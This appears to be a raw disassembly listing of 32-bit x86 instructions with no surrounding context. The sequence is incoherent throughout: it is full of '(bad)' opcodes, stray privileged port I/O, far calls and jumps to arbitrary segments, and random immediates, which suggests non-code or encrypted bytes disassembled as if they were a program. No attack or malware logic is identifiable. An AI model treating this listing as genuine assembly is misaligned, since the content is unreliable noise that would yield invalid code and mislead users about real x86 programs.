  6926a1:	fdiv   QWORD PTR [ecx-0x3ad05a76]
  6926a7:	sub    ah,dl
  6926a9:	ins    DWORD PTR es:[edi],dx
  6926aa:	and    ebp,DWORD PTR [edi*4+0x26922c88]
  6926b1:	push   ebp
  6926b2:	pop    esi
  6926b3:	dec    ebx
  6926b4:	(bad)  
  6926b5:	bound  edx,QWORD PTR cs:[ebp+0x183e4265]
  6926bc:	xor    eax,0xb3c3732
  6926c1:	jle    0x6926bb
  6926c3:	cli    
  6926c4:	cmc    
  6926c5:	push   ebp
  6926c6:	push   esi
  6926c7:	dec    eax
  6926c8:	test   BYTE PTR [ebx-0x20eb24f0],bl
  6926ce:	xchg   ebp,eax
  6926cf:	int3   
  6926d0:	sahf   
  6926d1:	mov    esp,0x83210e92
  6926d6:	popf   
  6926d7:	fxch   st(5)
  6926d9:	jae    0x692729
  6926db:	in     eax,dx
  6926dc:	jmp    0xff968ace
  6926e1:	dec    ebx
  6926e2:	rol    BYTE PTR [ebx+edx*1+0x4b],1
  6926e6:	test   bh,ch
  6926e8:	cmp    ah,BYTE PTR [edi]
  6926ea:	mov    eax,0x4a7a6ddd
  6926ef:	in     eax,0xcb
  6926f1:	ret    
  6926f2:	push   ss
  6926f3:	and    al,0x7b
  6926f5:	sub    BYTE PTR [edi+0x52],cl
  6926f8:	mov    bl,0xe8
  6926fa:	sub    bh,BYTE PTR [ebx-0x27]
  6926fd:	mov    ds:0xdad04808,al
  692702:	xchg   esi,eax
  692703:	adc    BYTE PTR [edi-0x24],bl
  692706:	pop    esp
  692707:	cmc    
  692708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  692709:	js     0x69274f
  69270b:	xchg   ebp,eax
  69270c:	shl    ebx,1
  69270e:	nop
  69270f:	imul   esi,ebp,0x41
  692712:	push   edi
  692713:	inc    esp
  692714:	icebp  
  692715:	sub    DWORD PTR [edx],ebp
  692717:	jb     0x6926be
  692719:	(bad)  
  69271a:	mov    al,0x96
  69271c:	mov    ecx,0x4410cf47
  692721:	jnp    0x69276a
  692723:	data16 int 0x31
  692726:	inc    ebx
  692727:	cmp    BYTE PTR [edi+ebx*4-0x3a],ah
  69272b:	and    DWORD PTR [edi],edi
  69272d:	(bad)  
  69272e:	ins    DWORD PTR es:[edi],dx
  69272f:	add    eax,0x17b380f6
  692734:	xchg   esp,eax
  692735:	cmc    
  692736:	sub    BYTE PTR [ecx-0x7157571e],ch
  69273c:	enter  0xc8fa,0x1d
  692740:	pop    eax
  692741:	imul   ecx,DWORD PTR [ecx],0xa9a40c60
  692747:	fnstcw WORD PTR [edi]
  692749:	sbb    ch,bl
  69274b:	xor    bl,ch
  69274d:	inc    ecx
  69274e:	sbb    al,0x2e
  692750:	jo     0x69274c
  692752:	pop    ecx
  692753:	push   edx
  692754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  692755:	xchg   edi,eax
  692756:	mov    edi,0xcc9c68d6
  69275b:	leave  
  69275c:	fsubr  DWORD PTR [edi+0x1c]
  69275f:	lock push edx
  692761:	icebp  
  692762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  692763:	jp     0x692729
  692765:	jl     0x69277c
  692767:	jno    0x6927c1
  692769:	sar    eax,1
  69276b:	xchg   esp,eax
  69276c:	loop   0x6927b5
  69276e:	(bad)
  692771:	pop    es
  692772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  692773:	popa   
  692774:	psadbw xmm2,xmm1
  692778:	jae    0x692788
  69277a:	mov    ebx,0xc34c79fc
  69277f:	inc    ebp
  692780:	test   BYTE PTR ds:0xfcbf9d1b,cl
  692786:	ins    BYTE PTR es:[edi],dx
  692787:	aam    0x1a
  692789:	lds    eax,FWORD PTR [ebp+0x79]
  69278c:	lock dec ebx
  69278e:	sahf   
  69278f:	mov    ds:0x8c69f4d8,al
  692794:	mul    DWORD PTR [esp+eiz*4-0x42]
  692798:	mov    eax,0x8fa7342c
  69279d:	stos   DWORD PTR es:[edi],eax
  69279e:	pushf  
  69279f:	call   0x8d7a:0xedee02a8
  6927a6:	pop    es
  6927a7:	adc    ecx,esp
  6927a9:	adc    eax,0xca0b7281
  6927ae:	mul    DWORD PTR ds:0x1d632f91
  6927b4:	jg     0x692743
  6927b6:	call   0xe43d:0x8d64baf1
  6927bd:	cmp    edi,0x3d
  6927c0:	mov    DWORD PTR [ebx+0xae5ba9f],esi
  6927c6:	mov    edx,0xbc9691e5
  6927cb:	pop    ds
  6927cc:	adc    BYTE PTR [eax],dl
  6927ce:	jl     0x69282b
  6927d0:	xchg   ebp,eax
  6927d1:	jo     0x692834
  6927d3:	xchg   DWORD PTR [edi],ecx
  6927d5:	cmp    ebx,DWORD PTR ds:0xf72db3dc
  6927dc:	sbb    dl,BYTE PTR [ebp-0x57ab9e19]
  6927e2:	icebp  
  6927e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6927e4:	scas   eax,DWORD PTR es:[edi]
  6927e5:	dec    edx
  6927e6:	push   cs
  6927e7:	jmp    0xa16:0xc7030015
  6927ee:	adc    ebx,edx
  6927f0:	sbb    esp,eax
  6927f2:	aaa    
  6927f3:	mov    ch,0xf8
  6927f5:	adc    ecx,DWORD PTR [ebx+0x65c9ebe7]
  6927fb:	fwait
  6927fc:	mov    ebx,?
  6927fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6927ff:	das    
  692800:	jbe    0x6927e7
  692802:	mov    BYTE PTR [ecx],ah
  692804:	mov    esp,0x2efaa6e
  692809:	into   
  69280a:	pop    ds
  69280b:	push   ds
  69280c:	mov    esi,0x12a445e2
  692811:	dec    esp
  692812:	pop    ebp
  692813:	mov    bl,0x11
  692815:	fs dec edx
  692817:	lods   eax,DWORD PTR ds:[si]
  692819:	retf   
  69281a:	pop    ss
  69281b:	dec    ebx
  69281c:	cmp    cl,BYTE PTR [esi]
  69281e:	shl    DWORD PTR [edi-0x382e6650],0xb5
  692825:	loopne 0x6927bf
  692827:	dec    ebp
  692828:	je     0x6927b3
  69282a:	jbe    0x6927f9
  69282c:	(bad)  
  69282d:	push   ebp
  69282e:	stc    
  69282f:	mov    ah,0x5c
  692831:	push   ebp
  692832:	test   al,0xc4
  692834:	ins    DWORD PTR es:[edi],dx
  692835:	xchg   esp,eax
  692836:	stos   BYTE PTR es:[edi],al
  692837:	jle    0x69282e
  692839:	sbb    eax,0x32f5b25a
  69283e:	xchg   ebx,eax
  69283f:	jnp    0x6928a6
  692841:	std    
  692842:	ror    BYTE PTR [ecx+0x2d5ab041],1
  692848:	mov    BYTE PTR cs:[esp+eiz*2],bh
  69284c:	adc    DWORD PTR fs:[edx],eax
  69284f:	adc    al,0x3
  692851:	mov    ch,0xb7
  692853:	(bad)  
  692854:	test   al,0xab
  692856:	add    BYTE PTR [bp-0x182f],al
  69285b:	push   es
  69285c:	inc    ebp
  69285d:	cmc    
  69285e:	fwait
  69285f:	aas    
  692860:	mov    ds:0xd37f0b2,al
  692865:	hlt    
  692866:	mov    ?,WORD PTR es:[edi+0x7c]
  69286a:	add    dh,BYTE PTR [edi-0x12]
  69286d:	push   edx
  69286e:	inc    ebx
  69286f:	(bad)  
  692870:	dec    edx
  692871:	jl     0x6928ed
  692873:	inc    ebp
  692874:	jg     0x692888
  692876:	ss std 
  692878:	shl    BYTE PTR [edi+0x57],0x93
  69287c:	aam    0x39
  69287e:	xchg   ecx,eax
  69287f:	mov    ds:0x8567deac,al
  692884:	call   0xa349d725
  692889:	jb     0x69286d
  69288b:	jg     0x692896
  69288d:	mov    cl,0xe1
  69288f:	out    0x78,al
  692891:	mov    ds:0xb54f71d5,al
  692896:	loopne 0x6928d0
  692898:	popa   
  692899:	xor    BYTE PTR [ecx],dl
  69289b:	and    si,cx
  69289e:	in     eax,dx
  69289f:	outs   dx,BYTE PTR ds:[esi]
  6928a0:	xor    eax,0x393fb402
  6928a5:	pop    ebp
  6928a6:	retf   0xf343
  6928a9:	mov    dl,dh
  6928ab:	outs   dx,BYTE PTR ds:[esi]
  6928ac:	gs push ebx
  6928ae:	daa    
  6928af:	test   al,0xdb
  6928b1:	cmp    BYTE PTR ds:0x5f5a64d3,ah
  6928b7:	mov    fs,edx
  6928b9:	(bad)  
  6928bb:	std    
  6928bc:	mov    bh,0xaf
  6928be:	aaa    
  6928bf:	inc    edi
  6928c0:	mov    ebx,0x3e765207
  6928c5:	sbb    eax,0x8d763873
  6928ca:	mov    bh,0xad
  6928cc:	pop    esp
  6928cd:	sub    eax,0x113a7745
  6928d2:	mov    bl,0xf1
  6928d4:	(bad)  
  6928d5:	in     eax,0xb6
  6928d7:	pop    ss
  6928d8:	shr    ebx,cl
  6928da:	inc    edx
  6928db:	jbe    0x692905
  6928dd:	and    esp,eax
  6928df:	mov    ah,0x69
  6928e1:	xlat   BYTE PTR ds:[ebx]
  6928e2:	mov    DWORD PTR [ebx],edi
  6928e4:	add    ebp,edi
  6928e6:	inc    ebx
  6928e7:	aaa    
  6928e8:	inc    ebp
  6928e9:	pop    edi
  6928ea:	push   0xa7a107b6
  6928ef:	xchg   ecx,eax
  6928f0:	inc    ecx
  6928f1:	fcom   DWORD PTR [ebp+0x2670d123]
  6928f7:	adc    dh,BYTE PTR [eax]
  6928f9:	fisub  DWORD PTR [eax+0x49545d7f]
  6928ff:	mov    ebp,0xa6c69cbf
  692904:	shl    BYTE PTR [edx-0x24],cl
  692907:	daa    
  692908:	fnstcw WORD PTR [edi]
  69290a:	jle    0x692916
  69290c:	fistp  DWORD PTR [ecx]
  69290e:	fisub  DWORD PTR [edx-0x5511905c]
  692914:	mov    ebx,0x220389c8
  692919:	sbb    bh,ch
  69291b:	loope  0x6928bb
  69291d:	jb     0x69290c
  69291f:	stc    
  692920:	xchg   esi,eax
  692921:	mov    WORD PTR [ecx],?
  692923:	std    
  692924:	pop    DWORD PTR [esi+0x1]
  692927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  692928:	outs   dx,BYTE PTR ds:[esi]
  692929:	mov    ecx,0xa673c06b
  69292e:	cmp    eax,0x5d267936
  692933:	stc    
  692934:	sub    DWORD PTR [eax+0x34fa1093],eax
  69293a:	repnz cmp dh,BYTE PTR ds:0x2c6fccd3
  692941:	inc    ebp
  692942:	test   ebx,0x401a843c
  692948:	jge    0x6929ab
  69294a:	scas   al,BYTE PTR es:[edi]
  69294b:	jnp    0x69290a
  69294d:	inc    esp
  69294e:	test   al,0x8f
  692950:	pop    ss
  692951:	das    
  692952:	dec    esp
  692953:	loop   0x692943
  692955:	adc    al,dl
  692957:	les    esi,FWORD PTR [esi-0x5]
  69295a:	ds jb  0x6929d7
  69295d:	jo     0x6928e1
  69295f:	push   0x78
  692961:	adc    DWORD PTR [ecx+eax*1+0x46b67cc0],0x18142a70
  69296c:	mov    esi,0x854012de
  692971:	lods   al,BYTE PTR ds:[esi]
  692972:	popf   
  692973:	cmp    al,0x46
  692975:	jge    0x692921
  692977:	lods   al,BYTE PTR ds:[esi]
  692978:	jl     0x6929d0
  69297a:	push   ebp
  69297b:	retf   0x7507
  69297e:	stc    
  69297f:	aas    
  692980:	or     bh,BYTE PTR [ebx-0x5f908ee8]
  692986:	push   edi
  692987:	inc    esi
  692988:	xlat   BYTE PTR ds:[ebx]
  692989:	aaa    
  69298a:	dec    ebx
  69298b:	fsubr  DWORD PTR [ebp+edx*4+0x67017d06]
  692992:	ror    DWORD PTR [ebp+eiz*1+0x4b],1
  692996:	sahf   
  692997:	(bad)  
  692998:	sbb    al,0x8d
  69299a:	clc    
  69299b:	sar    cl,cl
  69299d:	push   edi
  69299e:	mov    ebx,0x3fd15024
  6929a3:	push   esp
  6929a4:	stc    
  6929a5:	cs jbe 0x692975
  6929a8:	fbld   TBYTE PTR [eax+esi*8-0x28089627]
  6929af:	xchg   DWORD PTR [esi-0x3],edx
  6929b2:	pop    eax
  6929b3:	pusha  
  6929b4:	mov    al,ds:0x471960cb
  6929b9:	enter  0xd7f9,0xff
  6929bd:	xchg   esi,eax
  6929be:	fcmovnbe st,st(6)
  6929c0:	mov    DWORD PTR [ecx],ebp
  6929c2:	or     BYTE PTR [edx],0x86
  6929c5:	mov    al,ds:0xb5d78252
  6929ca:	xchg   DWORD PTR [esp+esi*1+0x7f],esp
  6929ce:	sub    ecx,0x1a
  6929d1:	rol    edi,1
  6929d3:	or     DWORD PTR [edi+0x60],eax
  6929d6:	or     al,0x81
  6929d8:	jbe    0x6929ed
  6929da:	add    al,0x15
  6929dc:	push   eax
  6929dd:	(bad)  
  6929de:	push   0x6a
  6929e0:	(bad)  
  6929e2:	fs ja  0x692981
  6929e5:	stos   BYTE PTR es:[edi],al
  6929e6:	or     eax,0x9524d1b8
  6929eb:	fist   DWORD PTR [esi+0x3d29ca2b]
  6929f1:	xchg   ecx,eax
  6929f2:	pop    ss
  6929f3:	(bad)  
  6929f4:	fstp   st(7)
  6929f6:	jg     0x6929a5
  6929f8:	frstor [ebp+0x41fb55af]
  6929fe:	inc    eax
  6929ff:	adc    dl,BYTE PTR [edi+edx*1-0x20e76f38]
  692a06:	push   ecx
  692a07:	xchg   DWORD PTR [edx],ebx
  692a09:	call   0xfc7e9224
  692a0e:	xor    edx,DWORD PTR [eax-0x152016bf]
  692a14:	sub    esi,esp
  692a16:	sbb    dh,BYTE PTR [ebp+0x637b2cfe]
  692a1c:	xor    DWORD PTR [ebx-0x38d58c70],esp
  692a22:	cmp    DWORD PTR [esi+0x6e0492c5],0xd
  692a29:	loope  0x6929f5
  692a2b:	xor    ah,ah
  692a2d:	cwde   
  692a2e:	pop    eax
  692a2f:	(bad)  
  692a30:	push   esp
  692a31:	aaa    
  692a32:	mov    WORD PTR [ebx+ecx*8-0x185ed524],cs
  692a39:	(bad)
  692a3d:	mov    ch,0x9b
  692a3f:	fidivr DWORD PTR [edx]
  692a41:	(bad)  
  692a42:	call   0x75d1eab6
  692a47:	fsin   
  692a49:	pop    ecx
  692a4a:	adc    dh,BYTE PTR [eax+0x4c]
  692a4d:	jae    0x692ac7
  692a4f:	int3   
  692a50:	sub    DWORD PTR [eax-0x72],edx
  692a53:	and    ch,0xb1
  692a56:	inc    esi
  692a57:	sub    al,BYTE PTR ds:0x1da0ee
  692a5d:	mov    ?,WORD PTR [esi+0x1e16e783]
  692a63:	repz sub ch,bh
  692a66:	dec    eax
  692a67:	aam    0x4b
  692a69:	imul   DWORD PTR [ecx]
  692a6b:	cld    
  692a6c:	jp     0x6929f4
  692a6e:	call   0x221d:0xf957e62c
  692a75:	je     0x6929f8
  692a77:	push   ebx
  692a78:	or     BYTE PTR ds:0x57034279,dl
  692a7e:	dec    eax
  692a7f:	mov    ah,0xd
  692a81:	outs   dx,DWORD PTR ds:[esi]
  692a82:	mov    ah,0x2f
  692a84:	xchg   ebx,eax
  692a85:	outs   dx,BYTE PTR ds:[si]
  692a87:	and    al,BYTE PTR [esi-0x1b]
  692a8a:	add    ebx,eax
  692a8c:	adc    BYTE PTR ds:0x577ec3da,bh
  692a92:	cmp    DWORD PTR [esi],0x917e5760
  692a98:	fnop   
  692a9a:	lock imul ecx,DWORD PTR [ecx+0x37],0x41
  692a9f:	jmp    0xdd6e:0x9100371c
  692aa6:	stc    
  692aa7:	enter  0x2f65,0x9a
  692aab:	sti    
  692aac:	aaa    
  692aad:	xchg   DWORD PTR ds:0x135f1d2b,ebp
  692ab3:	xchg   esp,eax
  692ab4:	or     eax,0x99e7821a
  692ab9:	sub    DWORD PTR [ebx+0x47d280b0],eax
  692abf:	xchg   ebp,eax
  692ac0:	pop    esi
  692ac1:	cld    
  692ac2:	sbb    eax,0x989507c2
  692ac7:	xor    BYTE PTR es:[esi],0xc9
  692acb:	cdq    
  692acc:	scas   al,BYTE PTR es:[edi]
  692acd:	xlat   BYTE PTR ds:[ebx]
  692ace:	lods   al,BYTE PTR ds:[esi]
  692acf:	std    
  692ad0:	ja     0x692a8e
  692ad2:	add    eax,0x8b5c6615
  692ad7:	jae    0x692b58
  692ad9:	adc    ah,BYTE PTR [esi]
  692adb:	repnz cli 
  692add:	mov    dl,0xe3
  692adf:	div    edi
  692ae1:	div    DWORD PTR [ebx+0x51f29656]
  692ae7:	dec    esp
  692ae8:	mov    bh,0xdf
  692aea:	cli    
  692aeb:	fidiv  WORD PTR [edi+eax*1-0x2259ef2d]
  692af2:	sub    ch,0x2c
  692af5:	mov    bl,0xb3
  692af7:	sub    bl,ch
  692af9:	mov    ds:0x167d817e,eax
  692afe:	loopne 0x692b20
  692b00:	(bad)  
  692b01:	(bad)  
  692b02:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  692b04:	push   cs
  692b05:	pop    esi
  692b06:	inc    ecx
  692b07:	and    ebp,esp
  692b09:	inc    esi
  692b0a:	and    BYTE PTR [ecx],0x79
  692b0d:	imul   esi,DWORD PTR [ecx],0xffffffef
  692b10:	and    dh,BYTE PTR [eax+0x197603a9]
  692b16:	add    BYTE PTR [edi+0x74479447],ah
  692b1c:	sbb    ah,BYTE PTR [eax-0x1243401c]
  692b22:	sbb    eax,0x22e61662
  692b27:	push   edx
  692b28:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  692b2a:	sti    
  692b2b:	sar    DWORD PTR [ecx],cl
  692b2d:	mov    esi,0x8551031e
  692b32:	std    
  692b33:	mov    ds:0x51855678,eax
  692b38:	stos   DWORD PTR es:[edi],eax
  692b39:	shl    cl,0x5c
  692b3c:	lea    esp,[eax+ebp*8+0x47]
  692b40:	mov    al,ds:0x71f5c510
  692b45:	(bad)  [edx]
  692b47:	or     eax,0xf227fe3
  692b4c:	and    ebx,DWORD PTR [edi+edi*2+0x9e3c64f]
  692b53:	push   ebp
  692b54:	push   ss
  692b55:	retf   
  692b56:	sti    
  692b57:	ins    BYTE PTR es:[edi],dx
  692b58:	clc    
  692b59:	add    DWORD PTR [eax-0x7b714f84],0x4369cb30
  692b63:	sub    edi,esp
  692b65:	mov    ch,0xb2
  692b67:	jmp    0xa9d6:0x40ed98c9
  692b6e:	xchg   edx,eax
  692b6f:	in     eax,dx
  692b70:	iret   
  692b71:	pop    ebp
  692b72:	aam    0x8b
  692b74:	xchg   ebp,eax
  692b75:	int3   
  692b76:	(bad)  
  692b77:	push   ds
  692b78:	or     edx,DWORD PTR [esi+0x5b80e0eb]
  692b7e:	xor    BYTE PTR [ecx+0x6e],0x6d
  692b82:	das    
  692b83:	(bad)  
  692b84:	sti    
  692b85:	dec    ebp
  692b86:	shl    BYTE PTR [esi],1
  692b88:	inc    ebp
  692b89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  692b8a:	mov    al,0xe5
  692b8c:	arpl   WORD PTR [ebp+ecx*4-0x24],di
  692b90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  692b91:	mov    cl,0x82
  692b93:	add    eax,0xe127380b
  692b98:	adc    DWORD PTR [esi-0x4e],edx
  692b9b:	push   es
  692b9c:	pop    esp
  692b9d:	iret   
  692b9e:	lahf   
  692b9f:	outs   dx,BYTE PTR ds:[esi]
  692ba0:	or     eax,0x6c0ea28b
  692ba5:	out    0x6c,al
  692ba7:	push   0xc0d45869
  692bac:	xor    eax,DWORD PTR [ebp-0x80]
  692baf:	xchg   ebx,eax
  692bb0:	das    
  692bb1:	ins    DWORD PTR es:[edi],dx
  692bb2:	arpl   sp,di
  692bb4:	aad    0xbf
  692bb6:	daa    
  692bb7:	inc    ecx
  692bb8:	jg     0x692bae
  692bba:	xor    eax,DWORD PTR [eax+0x48ffbb8a]
  692bc0:	mov    ds:0x38a6a5ba,eax
  692bc5:	mov    al,ds:0x31ec11b3
  692bca:	hlt    
  692bcb:	xchg   esi,eax
  692bcc:	push   edi
  692bcd:	repnz pop ebp
  692bcf:	es cdq 
  692bd1:	jp     0x692c12
  692bd3:	and    eax,DWORD PTR [ebx-0x2524b7c2]
  692bd9:	repz adc DWORD PTR [ecx+0x54353cb5],0xdb3c09bd
  692be4:	sbb    cl,BYTE PTR [eax]
  692be6:	lods   eax,DWORD PTR ds:[esi]
  692be7:	mov    DWORD PTR [esi],esp
  692be9:	je     0x692ba1
  692beb:	int3   
  692bec:	xchg   edi,eax
  692bed:	xchg   ebp,eax
  692bee:	or     DWORD PTR [edx-0x225c2575],ebp
  692bf4:	pop    ecx
  692bf5:	hlt    
  692bf6:	clc    
  692bf7:	xor    BYTE PTR [ecx+0x61],cl
  692bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  692bfb:	pop    edx
  692bfc:	neg    ebp
  692bfe:	iret   
  692bff:	xor    al,0x82
  692c01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  692c03:	(bad)  
  692c04:	sub    ecx,DWORD PTR ds:0x92e4c17a
  692c0a:	adc    al,0x22
  692c0c:	cmp    DWORD PTR [eax],edx
  692c0e:	mov    ebx,0xaaf81f12
  692c13:	inc    esi
  692c14:	or     al,0xec
  692c16:	idiv   eax
  692c18:	mov    ch,0x1f
  692c1a:	sub    eax,0x83dc6264
  692c1f:	sahf   
  692c20:	fs repz mov bh,0xd8
  692c24:	scas   eax,DWORD PTR es:[edi]
  692c25:	aaa    
  692c26:	retf   0xe5
  692c29:	adc    BYTE PTR [edx+0x5d],al
  692c2c:	dec    eax
  692c2d:	js     0x692bc0
  692c2f:	bound  eax,QWORD PTR [ecx+0x29f14ac]
  692c35:	mov    eax,0x7c4c30a5
  692c3a:	clc    
  692c3b:	push   edx
  692c3c:	ins    DWORD PTR es:[edi],dx
  692c3d:	sub    esp,edx
  692c3f:	retf   0x453d
  692c42:	(bad)  
  692c43:	fsubr  QWORD PTR [ebx-0x78c9ff7]
  692c49:	xlat   BYTE PTR ds:[ebx]
  692c4a:	mov    ebp,0xd8e770f5
  692c4f:	aam    0x5f
  692c51:	call   0x6a93:0xfc694240
  692c58:	mov    ecx,0xbe39c0d4
  692c5d:	add    esp,DWORD PTR [ebx+0x796a5ac9]
  692c63:	or     eax,0x3f135a2f
  692c68:	xchg   esi,eax
  692c69:	mov    ebp,0xda4b64ad
  692c6e:	test   eax,0x1d7ff051
  692c73:	xor    BYTE PTR ds:0xef780aff,al
  692c79:	mov    bl,0xed
  692c7b:	mov    WORD PTR [ecx+0x19],gs
  692c7e:	and    BYTE PTR [ebp-0xbbe2127],cl
  692c84:	push   0xdaab1a16
  692c89:	jmp    0x692c58
  692c8b:	adc    al,0x5d
  692c8d:	jg     0x692c77
  692c8f:	aas    
  692c90:	xor    BYTE PTR [edx],0x21
  692c93:	cs out dx,eax
  692c95:	mov    dh,0x73
  692c97:	add    al,BYTE PTR [esi+0x51]
  692c9a:	push   0x27e211f6
  692c9f:	pop    ss
  692ca0:	cmp    BYTE PTR [edi-0x14],al
  692ca3:	sub    ah,BYTE PTR [ebp-0x11]
  692ca6:	das    
  692ca7:	push   esi
  692ca8:	cdq    
  692ca9:	pop    esi
  692caa:	pop    es
  692cab:	fs sub eax,0x3bed194b
  692cb1:	dec    esi
  692cb2:	inc    ebx
  692cb3:	mov    eax,edi
  692cb5:	or     al,0x73
  692cb7:	hlt    
  692cb8:	(bad)  [edi+eax*4]
  692cbb:	fwait
  692cbc:	mov    ah,0x71
  692cbe:	loopne 0x692c92
  692cc0:	ds jmp 0x6e4a3a4e
  692cc6:	mov    edi,0x5084e475
  692ccb:	sub    ecx,edi
  692ccd:	jno    0x692d3e
  692ccf:	and    DWORD PTR [edx],ebp
  692cd1:	or     dh,BYTE PTR [ecx+ecx*1+0x6d19bf79]
  692cd8:	and    dl,BYTE PTR [ebx+0x6e4bc330]
  692cde:	jmp    0x680bca40
  692ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  692ce4:	popa   
  692ce5:	xchg   ebx,eax
  692ce6:	ins    DWORD PTR es:[edi],dx
  692ce7:	jnp    0x692cb5
  692ce9:	(bad)  
  692cea:	push   ss
  692ceb:	add    ah,ch
  692ced:	out    0xf5,eax
  692cef:	sbb    al,0xde
  692cf1:	sti    
  692cf2:	jnp    0x692d02
  692cf4:	jge    0x692c88
  692cf6:	fidiv  DWORD PTR [eax-0x31]
  692cf9:	imul   eax,ebx,0x1da62c31
  692cff:	jb     0x692cbf
  692d01:	mov    ebx,0x3a46b1eb
  692d06:	dec    edx
  692d07:	repnz mov cs,WORD PTR [ebx]
  692d0a:	scas   al,BYTE PTR es:[edi]
  692d0b:	cld    
  692d0c:	test   DWORD PTR [ecx+0x54],ebx
  692d0f:	sub    al,0x6d
  692d11:	mov    cl,0x8
  692d13:	jne    0x692cbc
  692d15:	mov    ah,0xd3
  692d17:	sbb    DWORD PTR [edi],ecx
  692d19:	lock cmp edx,0x3a
  692d1d:	push   ss
  692d1e:	jg     0x692cb2
  692d20:	xchg   ebp,eax
  692d21:	adc    DWORD PTR [eax+eiz*2+0x3a],ecx
  692d25:	test   BYTE PTR [edx],bl
  692d27:	rcl    BYTE PTR [esi-0x36],1
  692d2a:	retf   0x30b5
  692d2d:	rcl    BYTE PTR [ecx],cl
  692d2f:	fisubr WORD PTR [esi]
  692d31:	adc    al,0x85
  692d33:	ret    
  692d34:	inc    ebp
  692d35:	ficom  WORD PTR [ebx-0x2046fc88]
  692d3b:	or     BYTE PTR [ebp+esi*1-0xe],cl
  692d3f:	dec    eax
  692d40:	lds    ebp,FWORD PTR [ecx+0x3c]
  692d43:	pop    edi
  692d44:	jne    0x692dab
  692d46:	ja     0x692ccc
  692d48:	pop    esi
  692d49:	mov    dl,0x47
  692d4b:	add    al,0x83
  692d4d:	mov    ebx,0xdb019c2b
  692d52:	mov    esi,0xab6413c6
  692d57:	jae    0x692d05
  692d59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  692d5a:	sbb    DWORD PTR [eax],ebp
  692d5c:	mov    WORD PTR [ebx],ss
  692d5e:	outs   dx,DWORD PTR ds:[esi]
  692d5f:	mov    al,0x93
  692d61:	sbb    eax,0x5c49bf14
  692d66:	push   edi
  692d67:	xchg   esp,esi
  692d69:	lods   al,BYTE PTR ds:[esi]
  692d6a:	push   cs
  692d6b:	sub    BYTE PTR [ecx+0x1a2a0c55],bl
  692d71:	and    BYTE PTR [esi+edx*2-0x15],dh
  692d75:	push   edi
  692d76:	jmp    0x692ded
  692d78:	push   es
  692d79:	arpl   WORD PTR [edi+0x42f53846],bx
  692d7f:	push   esi
  692d80:	les    ebx,FWORD PTR [eax]
  692d82:	dec    ebp
  692d83:	sub    BYTE PTR [edi],al
  692d85:	xor    BYTE PTR [ecx+0x22a8505f],dh
  692d8b:	clc    
  692d8c:	pop    edx
  692d8d:	nop
  692d8e:	push   esp
  692d8f:	dec    ecx
  692d90:	push   esi
  692d91:	xor    DWORD PTR [edx+0x60],edi
  692d94:	xor    eax,DWORD PTR [esi]
  692d96:	sub    BYTE PTR [edi-0x4e],bl
  692d99:	dec    ebx
  692d9a:	rcl    dh,0xcc
  692d9d:	jo     0x692dce
  692d9f:	popa   
  692da0:	sbb    al,0x7f
  692da2:	and    eax,esi
  692da4:	push   ebx
  692da5:	mov    eax,ds:0xfa9076ab
  692daa:	sub    ecx,DWORD PTR [esi]
  692dac:	mov    dl,0xf9
  692dae:	fist   DWORD PTR [ebx]
  692db0:	test   esi,esp
  692db2:	aad    0xe2
  692db4:	pop    es
  692db5:	push   ss
  692db6:	cmp    edi,DWORD PTR [esi-0x4b]
  692db9:	loope  0x692e2d
  692dbb:	inc    edi
  692dbc:	imul   BYTE PTR [ebx]
  692dbe:	popa   
  692dbf:	mov    ebp,0xa0ae4d09
  692dc4:	scas   al,BYTE PTR es:[edi]
  692dc5:	and    DWORD PTR [eax+0x1c],eax
  692dc8:	mov    edi,0x9bdbbfc3
  692dcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  692dce:	pop    esi
  692dcf:	or     eax,0xdf45e409
  692dd4:	adc    dl,BYTE PTR [eax]
  692dd6:	scas   al,BYTE PTR es:[edi]
  692dd7:	mov    al,ds:0xd08df3d7
  692ddc:	mov    cl,BYTE PTR [eax+0x38]
  692ddf:	inc    edx
  692de0:	ss (bad) 
  692de2:	jge    0x692dcb
  692de4:	mov    ecx,DWORD PTR [ebx]
  692de6:	fwait
  692de7:	aam    0xf5
  692de9:	fnsave [ecx-0xf]
  692dec:	pop    ebx
  692ded:	dec    edx
  692dee:	popf   
  692def:	aad    0x3e
  692df1:	popa   
  692df2:	inc    edx
  692df3:	pop    edi
  692df4:	jne    0x692daf
  692df6:	test   al,0x95
  692df8:	mov    dl,0x73
  692dfa:	xor    eax,0xaf35f1c
  692dff:	lods   eax,DWORD PTR ds:[esi]
  692e00:	call   DWORD PTR [ebx-0x56]
  692e03:	test   DWORD PTR [ebx-0x73881ffb],ecx
  692e09:	(bad)  [edi]
  692e0b:	mov    ebx,0xc2568450
  692e10:	mov    eax,ds:0x78450ac3
  692e15:	ja     0x692db9
  692e17:	sbb    edx,DWORD PTR [edi+0x67]
  692e1a:	and    DWORD PTR ds:0x264dcdee,eax
  692e20:	neg    DWORD PTR [edi]
  692e22:	les    esi,FWORD PTR [ebx-0x19]
  692e25:	fsubrp st(3),st
  692e27:	xchg   esp,eax
  692e28:	mov    al,0x35
  692e2a:	mov    ah,0x36
  692e2c:	imul   ebx,DWORD PTR [ebp-0x46],0x917e7a9f
  692e33:	sti    
  692e34:	test   eax,0xed1ca9c6
  692e39:	jmp    0x7dc0:0x50bee03c
  692e40:	jae    0x692ec0
  692e42:	add    DWORD PTR [esi-0x4364b8e1],0x56a180a8
  692e4c:	call   0x71c69107
  692e51:	or     BYTE PTR [edx+edi*4],ch
  692e54:	and    al,dl
  692e56:	xchg   dh,dh
  692e58:	mov    al,ds:0xc208f2b
  692e5d:	outs   dx,BYTE PTR ds:[esi]
